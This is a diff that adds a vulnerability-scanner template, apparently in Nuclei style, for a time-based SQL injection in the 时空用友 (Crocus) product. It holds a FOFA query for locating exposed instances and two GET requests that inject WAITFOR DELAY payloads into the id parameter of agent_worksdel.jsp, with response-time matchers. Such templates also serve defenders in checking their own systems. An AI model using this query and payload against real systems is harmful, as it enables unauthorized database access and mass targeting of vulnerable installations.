@@ -1,0 +1,35 @@
+## id: VEID-2026-11115
+## name: 时空用友-agent_worksdel-Sql注入
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 时空用友-agent_worksdel-Sql注入，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## affects: 时空用友
+## fofa-query: product="Crocus" || (body="/ThirdResource/respond/respond.min.js" && title="Crocus")
+## verification: true
+
+
+
+GET /worksheet/agent_worksdel.jsp?id=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: JSESSIONID=EEB42BC80EB6BF1FACAD679583AF557B
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 5
+#@ matcher: status_code == 200
+
+---
+
+GET /worksheet/agent_worksdel.jsp?id=1%27;WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: JSESSIONID=EEB42BC80EB6BF1FACAD679583AF557B
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 8
+#@ matcher: status_code == 200
+
+# @VEIL-STAMP: 64e0ffba1ae583cb9228b377da7da591a91d1f1b87f8788911482ff789bf7c71
